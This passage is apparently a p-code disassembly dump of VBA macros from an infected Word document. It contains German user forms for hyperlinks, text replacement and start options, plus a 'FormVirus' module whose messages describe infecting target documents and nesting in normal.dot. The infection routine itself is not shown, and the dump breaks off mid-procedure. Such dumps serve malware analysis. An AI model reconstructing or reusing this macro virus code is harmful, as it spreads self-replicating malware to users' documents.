' 	ArgsLd Trim 0x0001 
' 	Ld Dat_HyperLink 
' 	MemSt Link 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #19:
' 	LitVarSpecial (True)
' 	St Abbruch 
' Line #20:
' 	Ld Dat_HyperLink 
' 	MemLd Link 
' 	Ld Text_HyperLink 
' 	MemSt Then 
' Line #21:
' 	Ld Text_HyperLink 
' 	ArgsMemCall SetFocus 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #24:
' 	StartWithExpr 
' 	Ld Dat_HyperLink 
' 	With 
' Line #25:
' 	Ld Abbruch 
' 	Not 
' 	IfBlock 
' Line #26:
' 	MemLdWith Link 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Dat_HyperLink 
' 	MemLd Link 
' 	ArgsLd UCase 0x0001 
' 	Ld HTTP 
' 	Ne 
' 	And 
' 	MemStWith OK 
' Line #27:
' 	MemLdWith OK 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	GoTo beenden 
' 	Else 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #28:
' 	MemLdWith Link 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld Dat_HyperLink 
' 	MemLd Link 
' 	ArgsLd UCase 0x0001 
' 	Ld HTTP 
' 	Ne 
' 	And 
' 	ElseIfBlock 
' Line #29:
' 	GoTo beenden 
' Line #30:
' 	LitStr 0x001D "Hyperlink-Eintrag verwerfen ?"
' 	Ld vbExclamation 
' 	Ld vbDefaultButton2 
' 	Add 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0010 "Bist du sicher ?"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	ElseIfBlock 
' Line #31:
' 	GoTo beenden 
' Line #32:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Cancel 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndWith 
' Line #35:
' 	ExitSub 
' Line #36:
' 	Label beenden 
' Line #37:
' 	StartWithExpr 
' 	Ld Dat_HyperLink 
' 	With 
' Line #38:
' 	LitStr 0x0000 ""
' 	MemStWith Link 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #40:
' 	EndWith 
' Line #41:
' 	EndSub 
' Line #42:
' Macros/VBA/FormReplace - 3691 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim 
' 	VarDefn Abbruch (As Boolean)
' Line #3:
' 	FuncDefn (Private Sub ButtonNO_Click())
' Line #4:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #5:
' 	EndSub 
' Line #6:
' 	FuncDefn (Private Sub ButtonOK_Click())
' Line #7:
' 	Ld Dat_Replace 
' 	MemLd Orginal 
' 	ArgsLd TestCodierung 0x0001 
' 	Ld Dat_Replace 
' 	MemLd Replace 
' 	ArgsLd TestCodierung 0x0001 
' 	And 
' 	IfBlock 
' Line #8:
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #9:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #10:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld CodeChar_ERROR 
' 	Ld vbCritical 
' 	Ld Title_ERROR 
' 	ArgsCall MsgBox 0x0003 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Private Sub Check_ganzesWort_Change())
' Line #14:
' 	Ld Check_ganzesWort 
' 	MemLd Value 
' 	Ld Dat_Replace 
' 	MemSt GanzesWort 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub Text_Orginal_Change())
' Line #17:
' 	Ld Text_Orginal 
' 	MemLd Then 
' 	ArgsLd Trim 0x0001 
' 	Ld Dat_Replace 
' 	MemSt Orginal 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Private Sub Text_Replace_Change())
' Line #20:
' 	Ld Text_Replace 
' 	MemLd Then 
' 	ArgsLd Trim 0x0001 
' 	Ld Dat_Replace 
' 	MemSt Replace 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #23:
' 	LitVarSpecial (True)
' 	St Abbruch 
' Line #24:
' 	StartWithExpr 
' 	Ld Dat_Replace 
' 	With 
' Line #25:
' 	MemLdWith Orginal 
' 	Ld Text_Orginal 
' 	MemSt Then 
' Line #26:
' 	MemLdWith Replace 
' 	Ld Text_Replace 
' 	MemSt Then 
' Line #27:
' 	MemLdWith GanzesWort 
' 	Ld Check_ganzesWort 
' 	MemSt Value 
' Line #28:
' 	EndWith 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #31:
' 	StartWithExpr 
' 	Ld Dat_Replace 
' 	With 
' Line #32:
' 	Ld Abbruch 
' 	Not 
' 	IfBlock 
' Line #33:
' 	MemLdWith Orginal 
' 	LitStr 0x0000 ""
' 	Ne 
' 	MemLdWith Replace 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	MemStWith OK 
' Line #34:
' 	MemLdWith OK 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	GoTo beenden 
' 	Else 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #35:
' 	MemLdWith Orginal 
' 	LitStr 0x0000 ""
' 	Eq 
' 	MemLdWith Replace 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #36:
' 	GoTo beenden 
' Line #37:
' 	LitStr 0x0019 "Alle Einträge verwerfen ?"
' 	Ld vbExclamation 
' 	Ld vbDefaultButton2 
' 	Add 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0010 "Bist du sicher ?"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	ElseIfBlock 
' Line #38:
' 	GoTo beenden 
' Line #39:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Cancel 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndWith 
' Line #42:
' 	ExitSub 
' Line #43:
' 	Label beenden 
' Line #44:
' 	StartWithExpr 
' 	Ld Dat_Replace 
' 	With 
' Line #45:
' 	LitStr 0x0000 ""
' 	MemStWith Orginal 
' Line #46:
' 	LitStr 0x0000 ""
' 	MemStWith Replace 
' Line #47:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #48:
' 	EndWith 
' Line #49:
' 	EndSub 
' Macros/VBA/FormStartOptionen - 5246 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim 
' 	VarDefn Abbruch (As Boolean)
' Line #3:
' 	FuncDefn (Private Sub Button_Datum_Click())
' Line #4:
' 	Ld FormDatum 
' 	ArgsMemCall Show 0x0000 
' Line #5:
' 	Ld Dat_Datum 
' 	MemLd OK 
' 	Ld Dat_Datum 
' 	MemSt Auswahl 
' Line #6:
' 	ArgsCall Button_Datum_View 0x0000 
' Line #7:
' 	EndSub 
' Line #8:
' 	FuncDefn (Private Sub Button_ZufallsGenerator_Click())
' Line #9:
' 	Ld FormGenerator 
' 	ArgsMemCall Show 0x0000 
' Line #10:
' 	Ld Dat_Zufall 
' 	MemLd OK 
' 	Ld Dat_Zufall 
' 	MemSt Auswahl 
' Line #11:
' 	ArgsCall Button_ZufallsGenerator_View 0x0000 
' Line #12:
' 	EndSub 
' Line #13:
' 	FuncDefn (Private Sub CommandNO_Click())
' Line #14:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Private Sub CommandOK_Click())
' Line #17:
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #18:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #19:
' 	EndSub 
' Line #20:
' 	FuncDefn (Private Sub Check_Datum_Change())
' Line #21:
' 	Ld Check_Datum 
' 	MemLd Value 
' 	Ld Dat_Datum 
' 	MemSt Auswahl 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Sub Check_ZufallsGenerator_Change())
' Line #24:
' 	Ld Check_ZufallsGenerator 
' 	MemLd Value 
' 	Ld Dat_Zufall 
' 	MemSt Auswahl 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #27:
' 	ArgsCall UserForm_Initialize 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #30:
' 	LitVarSpecial (True)
' 	St Abbruch 
' Line #31:
' 	Ld Button_Datum 
' 	ArgsMemCall SetFocus 0x0000 
' Line #32:
' 	ArgsCall Button_Datum_View 0x0000 
' Line #33:
' 	ArgsCall Button_ZufallsGenerator_View 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Private Sub Button_Datum_View())
' Line #36:
' 	Dim 
' 	VarDefn TagStr (As String)
' 	VarDefn MonatStr (As String)
' Line #37:
' 	StartWithExpr 
' 	Ld Dat_Datum 
' 	With 
' Line #38:
' 	MemLdWith OK 
' 	IfBlock 
' Line #39:
' 	MemLdWith JedenTag 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "   jeder Tag im"
' 	St TagStr 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0005 "   am"
' 	MemLdWith Tag 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	St TagStr 
' 	EndIf 
' Line #40:
' 	MemLdWith JedenMonat 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F " in jedem Monat"
' 	St MonatStr 
' 	Else 
' 	BoSImplicit 
' 	MemLdWith Monat 
' 	ArgsLd GetMonatsName 0x0001 
' 	St MonatStr 
' 	EndIf 
' Line #41:
' 	Ld MainUserForm 
' 	MemLd ImageOK 
' 	MemLd Picture 
' 	Ld Button_Datum 
' 	MemSt Picture 
' Line #42:
' 	Ld TagStr 
' 	Ld MonatStr 
' 	Concat 
' 	Ld Button_Datum 
' 	MemSt Caption 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	Ld MainUserForm 
' 	MemLd ImageNO 
' 	MemLd Picture 
' 	Ld Button_Datum 
' 	MemSt Picture 
' Line #45:
' 	LitStr 0x0006 " ...  "
' 	Ld Button_Datum 
' 	MemSt Caption 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	MemLdWith OK 
' 	Ld Check_Datum 
' 	MemSt Enabled 
' Line #48:
' 	MemLdWith Auswahl 
' 	Ld Check_Datum 
' 	MemSt Value 
' Line #49:
' 	EndWith 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Private Sub Button_ZufallsGenerator_View())
' Line #52:
' 	StartWithExpr 
' 	Ld Dat_Zufall 
' 	With 
' Line #53:
' 	MemLdWith OK 
' 	IfBlock 
' Line #54:
' 	Ld MainUserForm 
' 	MemLd ImageOK 
' 	MemLd Picture 
' 	Ld Button_ZufallsGenerator 
' 	MemSt Picture 
' Line #55:
' 	LitStr 0x0006 "   1 :"
' 	MemLdWith Randomize 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	Ld Button_ZufallsGenerator 
' 	MemSt Caption 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	Ld MainUserForm 
' 	MemLd ImageNO 
' 	MemLd Picture 
' 	Ld Button_ZufallsGenerator 
' 	MemSt Picture 
' Line #58:
' 	LitStr 0x0006 " ...  "
' 	Ld Button_ZufallsGenerator 
' 	MemSt Caption 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	MemLdWith OK 
' 	Ld Check_ZufallsGenerator 
' 	MemSt Enabled 
' Line #61:
' 	MemLdWith Auswahl 
' 	Ld Check_ZufallsGenerator 
' 	MemSt Value 
' Line #62:
' 	EndWith 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #65:
' 	Ld Abbruch 
' 	IfBlock 
' Line #66:
' 	Ld Dat_Datum 
' 	MemLd OK 
' 	Ld Dat_Zufall 
' 	MemLd OK 
' 	Or 
' 	IfBlock 
' Line #67:
' 	LitStr 0x0019 "Alle Einträge verwerfen ?"
' 	Ld vbExclamation 
' 	Ld vbDefaultButton2 
' 	Add 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0010 "Bist du sicher ?"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #68:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Cancel 
' 	BoS 0x0000 
' 	ExitSub 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	ElseBlock 
' 	BoS 0x0000 
' 	ExitSub 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartWithExpr 
' 	Ld Dat_Datum 
' 	With 
' Line #74:
' 	LitDI2 0x0001 
' 	MemStWith Tag 
' Line #75:
' 	LitDI2 0x0001 
' 	MemStWith Monat 
' Line #76:
' 	LitVarSpecial (False)
' 	MemStWith JedenTag 
' Line #77:
' 	LitVarSpecial (False)
' 	MemStWith JedenMonat 
' Line #78:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #79:
' 	LitVarSpecial (False)
' 	MemStWith Auswahl 
' Line #80:
' 	MemLdWith OK 
' 	Ld Check_Datum 
' 	MemSt Enabled 
' Line #81:
' 	EndWith 
' Line #82:
' 	StartWithExpr 
' 	Ld Dat_Zufall 
' 	With 
' Line #83:
' 	LitDI2 0x0000 
' 	MemStWith Randomize 
' Line #84:
' 	LitVarSpecial (False)
' 	MemStWith OK 
' Line #85:
' 	LitVarSpecial (False)
' 	MemStWith Auswahl 
' Line #86:
' 	EndWith 
' Line #87:
' 	EndSub 
' Macros/VBA/FormTextBox - 6140 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim 
' 	VarDefn Symbol (As Byte)
' 	VarDefn OldSymbol (As Byte)
' 	VarDefn Abbruch (As Boolean)
' Line #3:
' 	FuncDefn (Private Sub Check_mitSymbol_Change())
' Line #4:
' 	Ld Check_mitSymbol 
' 	MemLd Value 
' 	IfBlock 
' Line #5:
' 	LitVarSpecial (True)
' 	Ld Option_VbCritical 
' 	MemSt Enabled 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld Option_VbQuestion 
' 	MemSt Enabled 
' Line #7:
' 	LitVarSpecial (True)
' 	Ld Option_VbExclamation 
' 	MemSt Enabled 
' Line #8:
' 	LitVarSpecial (True)
' 	Ld Option_VbInformation 
' 	MemSt Enabled 
' Line #9:
' 	Ld OldSymbol 
' 	St Symbol 
' Line #10:
' 	ElseBlock 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Option_VbCritical 
' 	MemSt Enabled 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Option_VbQuestion 
' 	MemSt Enabled 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Option_VbExclamation 
' 	MemSt Enabled 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Option_VbInformation 
' 	MemSt Enabled 
' Line #15:
' 	Ld Symbol 
' 	St OldSymbol 
' Line #16:
' 	LitDI2 0x0000 
' 	St Symbol 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Private Sub Command_Test_Click())
' Line #20:
' 	Ld Dat_TextBox 
' 	MemLd Title 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	ArgsLd Trim 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #21:
' 	LitStr 0x001F "Nichs zum Testen gefunden.     "
' 	Ld vbInformation 
' 	LitStr 0x001A "Kein Eintrag vorhanden !!!"
' 	ArgsCall MsgBox 0x0003 
' Line #22:
' 	ExitSub 
' Line #23:
' 	Ld Dat_TextBox 
' 	MemLd Title 
' 	ArgsLd TestCodierung 0x0001 
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	ArgsLd TestCodierung 0x0001 
' 	And 
' 	ElseIfBlock 
' Line #24:
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	Ld Symbol 
' 	Ld Dat_TextBox 
' 	MemLd Title 
' 	ArgsCall MsgBox 0x0003 
' Line #25:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld CodeChar_ERROR 
' 	Ld vbCritical 
' 	Ld Title_ERROR 
' 	ArgsCall MsgBox 0x0003 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Private Sub CommandOK_Click())
' Line #29:
' 	Ld Dat_TextBox 
' 	MemLd Title 
' 	ArgsLd TestCodierung 0x0001 
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	ArgsLd TestCodierung 0x0001 
' 	And 
' 	IfBlock 
' Line #30:
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #31:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #32:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld CodeChar_ERROR 
' 	Ld vbCritical 
' 	Ld Title_ERROR 
' 	ArgsCall MsgBox 0x0003 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Private Sub CommandNO_Click())
' Line #36:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Private Sub Option_VbCritical_Change())
' Line #39:
' 	Ld vbCritical 
' 	St Symbol 
' Line #40:
' 	Ld Symbol 
' 	Ld Dat_TextBox 
' 	MemSt Symbol 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Private Sub Option_VbQuestion_Change())
' Line #43:
' 	Ld vbQuestion 
' 	St Symbol 
' Line #44:
' 	Ld Symbol 
' 	Ld Dat_TextBox 
' 	MemSt Symbol 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Private Sub Option_VbExclamation_Change())
' Line #47:
' 	Ld vbExclamation 
' 	St Symbol 
' Line #48:
' 	Ld Symbol 
' 	Ld Dat_TextBox 
' 	MemSt Symbol 
' Line #49:
' 	EndSub 
' Line #50:
' 	FuncDefn (Private Sub Option_VbInformation_Change())
' Line #51:
' 	Ld vbInformation 
' 	St Symbol 
' Line #52:
' 	Ld Symbol 
' 	Ld Dat_TextBox 
' 	MemSt Symbol 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Private Sub Text_Title_Change())
' Line #55:
' 	Ld Text_Title 
' 	MemLd Then 
' 	Ld Dat_TextBox 
' 	MemSt Title 
' Line #56:
' 	Ld Dat_TextBox 
' 	MemLd Title 
' 	FnLen 
' 	ArgsLd Str 0x0001 
' 	St LabelInfo1 
' Line #57:
' 	EndSub 
' Line #58:
' 	FuncDefn (Private Sub Text_Prompt_Change())
' Line #59:
' 	Ld Text_Prompt 
' 	MemLd Then 
' 	FnLen 
' 	LitDI2 0x0063 
' 	Gt 
' 	IfBlock 
' Line #60:
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	Ld Text_Prompt 
' 	MemSt Then 
' 	BoS 0x0000 
' 	ArgsCall Beep 0x0000 
' Line #61:
' 	ElseBlock 
' Line #62:
' 	Ld Text_Prompt 
' 	MemLd Then 
' 	Ld Dat_TextBox 
' 	MemSt Prompt 
' Line #63:
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	FnLen 
' 	ArgsLd Str 0x0001 
' 	St LabelInfo2 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #67:
' 	Ld Text_Title 
' 	ArgsMemCall SetFocus 0x0000 
' Line #68:
' 	Ld Dat_TextBox 
' 	MemLd Title 
' 	St Text_Title 
' Line #69:
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	St Text_Prompt 
' Line #70:
' 	Ld Dat_TextBox 
' 	MemLd Title 
' 	FnLen 
' 	ArgsLd Str 0x0001 
' 	St LabelInfo1 
' Line #71:
' 	Ld Dat_TextBox 
' 	MemLd Prompt 
' 	FnLen 
' 	ArgsLd Str 0x0001 
' 	St LabelInfo2 
' Line #72:
' 	Ld Dat_TextBox 
' 	MemLd Symbol 
' 	SelectCase 
' Line #73:
' 	Ld vbCritical 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option_VbCritical 
' 	MemSt Value 
' Line #74:
' 	Ld vbQuestion 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option_VbQuestion 
' 	MemSt Value 
' Line #75:
' 	Ld vbExclamation 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option_VbExclamation 
' 	MemSt Value 
' Line #76:
' 	Ld vbInformation 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld Option_VbInformation 
' 	MemSt Value 
' Line #77:
' 	EndSelect 
' Line #78:
' 	Ld Dat_TextBox 
' 	MemLd SymbolAktiv 
' 	Ld Check_mitSymbol 
' 	MemSt Value 
' Line #79:
' 	Ld Dat_TextBox 
' 	MemLd Symbol 
' 	St Symbol 
' Line #80:
' 	LitVarSpecial (True)
' 	St Abbruch 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer))
' Line #83:
' 	StartWithExpr 
' 	Ld Dat_TextBox 
' 	With 
' Line #84:
' 	Ld Abbruch 
' 	Not 
' 	IfBlock 
' Line #85:
' 	MemLdWith Title 
' 	LitStr 0x0000 ""
' 	Ne 
' 	MemLdWith Prompt 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	MemStWith OK 
' Line #86:
' 	MemLdWith OK 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	GoTo beenden 
' 	Else 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #87:
' 	MemLdWith Title 
' 	LitStr 0x0000 ""
' 	Eq 
' 	MemLdWith Prompt 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	ElseIfBlock 
' Line #88:
' 	GoTo beenden 
' Line #89:
' 	LitStr 0x0028 "Alle Einträge in der Textbox verwerfen ?"
' 	Ld vbExclamation 
' 	Ld vbDefaultButton2 
' 	Add 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0010 "Bist du sicher ?"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	ElseIfBlock 
' Line #90:
' 	GoTo beenden 
' Line #91:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	St Cancel 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #92:
' 	EndIfBlock 
' Line #93:
' 	EndWith 
' Line #94:
' 	ExitSub 
' Line #95:
' 	Label beenden 
' Line #96:
' 	LitStr 0x0000 ""
' 	Ld Dat_TextBox 
' 	MemSt Title 
' Line #97:
' 	LitStr 0x0000 ""
' 	Ld Dat_TextBox 
' 	MemSt Prompt 
' Line #98:
' 	LitVarSpecial (False)
' 	Ld Dat_TextBox 
' 	MemSt OK 
' Line #99:
' 	EndSub 
' Macros/VBA/FormVirus - 6754 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Dim 
' 	VarDefn Abbruch (As Boolean)
' Line #3:
' 	FuncDefn (Private Sub Command_DocNeu_Click())
' Line #4:
' 	Dim 
' 	VarDefn OldZiel (As Object)
' Line #5:
' 	SetStmt 
' 	Ld ZielDocument 
' 	Set OldZiel 
' Line #6:
' 	SetStmt 
' 	Ld Documents 
' 	MemLd Add 
' 	Set ZielDocument 
' Line #7:
' 	Ld ZielDocument 
' 	ArgsLd SaveAs 0x0001 
' 	IfBlock 
' Line #8:
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	Ld Label_Ziel 
' 	MemSt Caption 
' Line #9:
' 	ArgsCall Init_Liste 0x0000 
' Line #10:
' 	ElseBlock 
' Line #11:
' 	Ld ZielDocument 
' 	ArgsMemCall Close 0x0000 
' Line #12:
' 	SetStmt 
' 	Ld OldZiel 
' 	Set ZielDocument 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Private Sub Command_DocOpen_Click())
' Line #16:
' 	Dim 
' 	VarDefn OK (As Boolean)
' Line #17:
' 	LineCont 0x000C 07 00 08 00 0B 00 08 00 11 00 08 00
' 	LitStr 0x0053 "ACHTUNG - Ich kann nicht prüfen ob das zu öffnende Dokument schon infiziert ist !!!"
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x004F "Wenn du versuchst ein infiziertes Dokument zu öffnen, dann macht sich die darin"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x004F "enthaltende Kopie von mir sofort daran sich in deiner "normal.dot" einzunisten."
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0014 "Also sei vorsichtig."
' 	Concat 
' 	Ld vbExclamation 
' 	Ld EsIstIch 
' 	LitStr 0x0009 "- WARNUNG"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #18:
' 	LitVarSpecial (False)
' 	St OK 
' Line #19:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #20:
' 	LitVarSpecial (True)
' 	St OK 
' Line #21:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ZielDocument 
' Line #22:
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	Ld Label_Ziel 
' 	MemSt Caption 
' Line #23:
' 	ArgsCall Init_Liste 0x0000 
' Line #24:
' 	LitStr 0x003F "Soll ich zur Sicherheit eine Kopie des Zieldokument infizieren."
' 	Ld vbQuestion 
' 	Ld vbDefaultButton1 
' 	Add 
' 	Ld vbYesNo 
' 	Add 
' 	Ld EsIstIch 
' 	LitStr 0x001B " - Sicherheitskopie anlegen"
' 	Concat 
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld ZielDocument 
' 	ArgsLd SaveAs 0x0001 
' 	IfBlock 
' Line #26:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ZielDocument 
' Line #27:
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	Ld Label_Ziel 
' 	MemSt Caption 
' Line #28:
' 	ArgsCall Init_Liste 0x0000 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitStr 0x0024 "Dokument wurde nicht geöffnet !!!   "
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001A "Vorgang wurde abgebrochen."
' 	Concat 
' 	Ld vbCritical 
' 	Ld EsIstIch 
' 	LitStr 0x000A " - Abbruch"
' 	Concat 
' 	ArgsCall MsgBox 0x0003 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Private Sub CommandNO_Click())
' Line #36:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Private Sub CommandOK_Click())
' Line #39:
' 	Ld ZielDocument 
' 	LitNothing 
' 	Is 
' 	IfBlock 
' Line #40:
' 	LitStr 0x0027 "Es wurde kein Ziel-Dokument ausgewählt."
' 	Ld vbCritical 
' 	LitStr 0x0011 "Wo soll ich hin ?"
' 	ArgsCall MsgBox 0x0003 
' Line #41:
' 	ElseBlock 
' Line #42:
' 	LitVarSpecial (False)
' 	St Abbruch 
' Line #43:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Private Sub List_Doc_DblClick(ByVal Cancel As ))
' Line #47:
' 	Dim 
' 	VarDefn OldZiel (As Object)
' Line #48:
' 	Ld List_Doc 
' 	MemLd ListIndex 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #49:
' 	SetStmt 
' 	Ld ZielDocument 
' 	Set OldZiel 
' Line #50:
' 	SetStmt 
' 	Ld List_Doc 
' 	MemLd ListIndex 
' 	Ld List_Doc 
' 	ArgsMemLd List 0x0001 
' 	ArgsLd Documents 0x0001 
' 	Set ZielDocument 
' Line #51:
' 	LitDI2 0x0002 
' 	Ld ZielDocument 
' 	MemLd FullName 
' 	LitStr 0x0002 ":\"
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	Ld ZielDocument 
' 	ArgsLd SaveAs 0x0001 
' 	Not 
' 	IfBlock 
